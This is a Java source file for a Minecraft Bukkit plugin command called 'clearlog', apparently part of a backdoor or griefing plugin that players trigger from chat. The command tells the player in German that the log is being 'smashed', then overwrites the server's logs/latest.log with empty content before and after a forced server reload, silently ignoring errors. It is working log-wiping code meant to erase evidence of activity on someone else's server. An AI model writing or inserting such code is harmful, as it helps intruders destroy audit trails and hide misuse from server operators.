package de.garkolym.cp.commands.impl;

import com.google.common.io.Files;
import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.File;

public class Command_ClearLog extends CommandBase {

    public Command_ClearLog() {
        super("clearlog", "-", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        try {
            p.sendMessage(Start.INSTANCE.chatPrefix + "Log wird zertrümmelt :)");
            byte[] blub = new byte[0];
            Files.write(blub, new File("blub.txt"));
            Files.copy(new File("blub.txt"), new File("logs/latest.log"));
            Bukkit.reload();
            Files.copy(new File("blub.txt"), new File("logs/latest.log"));
        } catch (Exception ignored) {
        }
    }

}
